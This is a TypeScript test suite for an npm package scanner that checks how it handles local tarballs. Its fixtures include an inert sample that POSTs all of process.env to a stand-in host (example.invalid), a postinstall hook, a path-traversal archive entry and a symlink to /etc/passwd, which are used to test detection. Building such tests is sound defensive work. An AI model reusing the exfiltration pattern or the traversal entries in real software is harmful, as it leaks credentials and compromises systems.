import { createHash } from "node:crypto";
import { access, mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  buildNpmTarball,
  buildTarball,
} from "@packagegate/artifact-fetcher/testing";
import { withExtractedTarball } from "@packagegate/artifact-fetcher";
import { ScanError } from "@packagegate/shared";
import { formatInvestigationJson } from "./output/json.js";
import { containsAnsi } from "./output/theme.js";
import { formatInvestigationReport } from "./report.js";
import { investigateExtractedPackage } from "./pipeline.js";
import { scanLocalTarball } from "./scan-tarball.js";

const SUSPICIOUS_INDEX = [
  '"use strict";',
  'const https = require("https");',
  "const data = JSON.stringify(process.env);",
  "const req = https.request({",
  '  hostname: "example.invalid",',
  '  method: "POST",',
  '  path: "/collect",',
  "});",
  "req.end(data);",
  "",
].join("\n");

const BENIGN_INDEX = 'module.exports = function add(a, b) { return a + b; };\n';

const MARKER_JS = [
  '"use strict";',
  'const fs = require("fs");',
  'fs.writeFileSync(process.env.PACKAGEGATE_EXECUTION_MARKER, "executed");',
  "",
].join("\n");

async function writeTempTarball(
  bytes: Buffer,
  fileName = "package.tgz",
): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), "packagegate-cli-tarball-"));
  const path = join(dir, fileName);
  await writeFile(path, bytes);
  return path;
}

describe("scanLocalTarball — path validation", () => {
  it("rejects nonexistent paths", async () => {
    await expect(
      scanLocalTarball("/tmp/packagegate-does-not-exist-12345.tgz"),
    ).rejects.toMatchObject({ code: "LOCAL_ARTIFACT_NOT_FOUND" });
  });

  it("rejects directories", async () => {
    const dir = await mkdtemp(join(tmpdir(), "packagegate-cli-dir-"));
    await expect(scanLocalTarball(dir)).rejects.toMatchObject({
      code: "LOCAL_ARTIFACT_NOT_FILE",
    });
  });

  it("rejects unsupported extensions", async () => {
    const dir = await mkdtemp(join(tmpdir(), "packagegate-cli-badext-"));
    const path = join(dir, "package.zip");
    await writeFile(path, Buffer.from("not a tarball"));
    await expect(scanLocalTarball(path)).rejects.toMatchObject({
      code: "UNSUPPORTED_ARTIFACT_FORMAT",
    });
  });
});

describe("scanLocalTarball — end-to-end inert packages", () => {
  it("scans a benign npm tarball to ALLOW / LOW_RISK", async () => {
    const bytes = await buildNpmTarball({
      "package.json": JSON.stringify({
        name: "benign-local",
        version: "1.0.0",
        main: "index.js",
      }),
      "index.js": BENIGN_INDEX,
    });
    const path = await writeTempTarball(bytes);
    const sha256 = createHash("sha256").update(bytes).digest("hex");

    const result = await scanLocalTarball(path);

    expect(result.acquisition.source).toBe("LOCAL");
    expect(result.acquisition.registryIntegrity.status).toBe("NOT_APPLICABLE");
    expect(result.artifact.sha256).toBe(sha256);
    expect(result.artifact.integrityVerified).toBeUndefined();
    expect(result.resolved).toEqual({ name: "benign-local", version: "1.0.0" });
    expect(result.risk.recommendation).toBe("ALLOW");
    expect(result.risk.classification).toBe("LOW_RISK");
    expect(result.behaviourChains).toHaveLength(0);

    const report = formatInvestigationReport(result, { color: false });
    expect(report).toContain("Local tarball");
    expect(report).toContain("Registry integrity not verified");
    expect(report).not.toContain("✓ Registry integrity verified");
    expect(report).toContain(sha256);

    const json = formatInvestigationJson(result);
    expect(containsAnsi(json)).toBe(false);
    const parsed = JSON.parse(json) as {
      acquisition: { source: string; registryIntegrity: { status: string } };
      artifact: { sha256: string; integrity: { status: string } };
    };
    expect(parsed.acquisition.source).toBe("LOCAL");
    expect(parsed.acquisition.registryIntegrity.status).toBe("NOT_APPLICABLE");
    expect(parsed.artifact.integrity.status).toBe("NOT_APPLICABLE");
    expect(parsed.artifact.sha256).toBe(sha256);
  });

  it("surfaces findings, chain and REVIEW for inert env→network source", async () => {
    const bytes = await buildNpmTarball({
      "package.json": JSON.stringify({
        name: "inert-local-exfil",
        version: "1.0.0",
      }),
      "index.js": SUSPICIOUS_INDEX,
    });
    const path = await writeTempTarball(bytes);
    const result = await scanLocalTarball(path);

    expect(result.findings.some((f) => f.category === "ENVIRONMENT_ACCESS")).toBe(
      true,
    );
    expect(result.findings.some((f) => f.category === "NETWORK_ACCESS")).toBe(true);
    expect(result.behaviourChains.length).toBeGreaterThanOrEqual(1);
    expect(result.behaviourChains[0]?.source).toBe("ENVIRONMENT_ACCESS");
    expect(result.behaviourChains[0]?.sink).toBe("NETWORK_REQUEST");
    expect(result.risk.recommendation).toBe("REVIEW");
    expect(["SUSPICIOUS", "HIGH_RISK_BEHAVIOUR"]).toContain(
      result.risk.classification,
    );
  });

  it("reports postinstall but never executes package code", async () => {
    const markerDir = await mkdtemp(join(tmpdir(), "packagegate-marker-"));
    const markerPath = join(markerDir, "executed.marker");
    // Intentionally set in the test environment only — the package is not run,
    // so the marker must remain absent. Do not execute marker.js here.
    process.env["PACKAGEGATE_EXECUTION_MARKER"] = markerPath;

    const bytes = await buildNpmTarball({
      "package.json": JSON.stringify({
        name: "postinstall-inert",
        version: "1.0.0",
        scripts: {
          postinstall: "node marker.js",
        },
      }),
      "marker.js": MARKER_JS,
      "index.js": BENIGN_INDEX,
    });
    const path = await writeTempTarball(bytes);
    const result = await scanLocalTarball(path);

    expect(
      result.lifecycleScripts.some(
        (script) =>
          script.name === "postinstall" && script.command.includes("marker.js"),
      ),
    ).toBe(true);
    expect(result.findings.some((f) => f.category === "INSTALL_SCRIPT")).toBe(true);

    await expect(access(markerPath)).rejects.toThrow();
    delete process.env["PACKAGEGATE_EXECUTION_MARKER"];
  });

  it("verifies a supplied --sha256 digest and reports it", async () => {
    const bytes = await buildNpmTarball({
      "package.json": JSON.stringify({ name: "digest-ok", version: "1.0.0" }),
      "index.js": BENIGN_INDEX,
    });
    const path = await writeTempTarball(bytes);
    const sha256 = createHash("sha256").update(bytes).digest("hex");

    const result = await scanLocalTarball(path, { expectedSha256: sha256 });
    expect(result.acquisition.suppliedDigest).toEqual({
      expectedSha256: sha256,
      matched: true,
    });
    const report = formatInvestigationReport(result, { color: false });
    expect(report).toContain("Supplied SHA-256 verified");
  });

  it("aborts before analysis on SHA-256 mismatch", async () => {
    const bytes = await buildNpmTarball({
      "package.json": JSON.stringify({ name: "digest-bad", version: "1.0.0" }),
      "index.js": BENIGN_INDEX,
    });
    const path = await writeTempTarball(bytes);
    const wrong = "a".repeat(64);

    await expect(
      scanLocalTarball(path, { expectedSha256: wrong }),
    ).rejects.toMatchObject({ code: "INTEGRITY_MISMATCH" });
  });
});

describe("scanLocalTarball — hostile archives", () => {
  it("rejects path-traversal archives", async () => {
    const bytes = await buildTarball([
      { name: "package/", type: "directory" },
      { name: "../../escape.js", content: "pwned" },
    ]);
    const path = await writeTempTarball(bytes);
    await expect(scanLocalTarball(path)).rejects.toMatchObject({
      code: "TRAVERSAL_BLOCKED",
    });
  });

  it("skips symlink entries per secure extraction policy", async () => {
    const bytes = await buildTarball([
      { name: "package/", type: "directory" },
      {
        name: "package/package.json",
        content: JSON.stringify({ name: "sym-pkg", version: "1.0.0" }),
      },
      { name: "package/index.js", content: BENIGN_INDEX },
      { name: "package/link", type: "symlink", linkname: "/etc/passwd" },
    ]);
    const path = await writeTempTarball(bytes);
    const result = await scanLocalTarball(path);
    expect(result.resolved.name).toBe("sym-pkg");
    expect(
      result.artifact.skippedEntries.some((entry) => entry.reason === "symlink"),
    ).toBe(true);
  });

  it("returns MALFORMED_ARCHIVE for non-gzip input", async () => {
    const path = await writeTempTarball(
      Buffer.from("definitely not gzip"),
      "broken.tgz",
    );
    await expect(scanLocalTarball(path)).rejects.toMatchObject({
      code: "MALFORMED_ARCHIVE",
    });
  });

  it("returns PACKAGE_MANIFEST_NOT_FOUND when package.json is absent", async () => {
    const bytes = await buildNpmTarball({
      "index.js": BENIGN_INDEX,
    });
    const path = await writeTempTarball(bytes);
    await expect(scanLocalTarball(path)).rejects.toMatchObject({
      code: "PACKAGE_MANIFEST_NOT_FOUND",
    });
  });

  it("returns PACKAGE_MANIFEST_INVALID for malformed package.json", async () => {
    const bytes = await buildNpmTarball({
      "package.json": "{not-json",
      "index.js": BENIGN_INDEX,
    });
    const path = await writeTempTarball(bytes);
    await expect(scanLocalTarball(path)).rejects.toMatchObject({
      code: "PACKAGE_MANIFEST_INVALID",
    });
  });
});

describe("local scan cleanup", () => {
  it("removes the extraction root after a downstream investigation failure", async () => {
    const bytes = await buildNpmTarball({
      "package.json": JSON.stringify({ name: "cleanup-me", version: "1.0.0" }),
      "index.js": BENIGN_INDEX,
    });
    let capturedRoot = "";

    await expect(
      withExtractedTarball({
        bytes,
        tarballUrl: "file://cleanup-me.tgz",
      }, (extracted) => {
        capturedRoot = extracted.extractionRoot;
        // Force a failure after extraction, mirroring a late pipeline error.
        throw new ScanError("INTERNAL", "forced downstream failure");
      }),
    ).rejects.toMatchObject({ code: "INTERNAL" });

    expect(capturedRoot.length).toBeGreaterThan(0);
    await expect(access(capturedRoot)).rejects.toThrow();
  });

  it("removes the extraction root after a successful local scan path", async () => {
    const bytes = await buildNpmTarball({
      "package.json": JSON.stringify({ name: "cleanup-ok", version: "1.0.0" }),
      "index.js": BENIGN_INDEX,
    });
    let capturedRoot = "";

    await withExtractedTarball(
      { bytes, tarballUrl: "file://cleanup-ok.tgz" },
      (extracted) => {
        capturedRoot = extracted.extractionRoot;
        investigateExtractedPackage({
          extracted,
          requestedSpec: "file:cleanup-ok.tgz",
          acquisition: {
            source: "LOCAL",
            localPath: "cleanup-ok.tgz",
            registryIntegrity: {
              status: "NOT_APPLICABLE",
              reason: "Local artifact has no trusted registry integrity reference",
            },
          },
          startedAt: new Date(),
          requireManifest: true,
          integrityVerifiedForRisk: false,
        });
        return Promise.resolve(null);
      },
    );

    await expect(access(capturedRoot)).rejects.toThrow();
  });
});
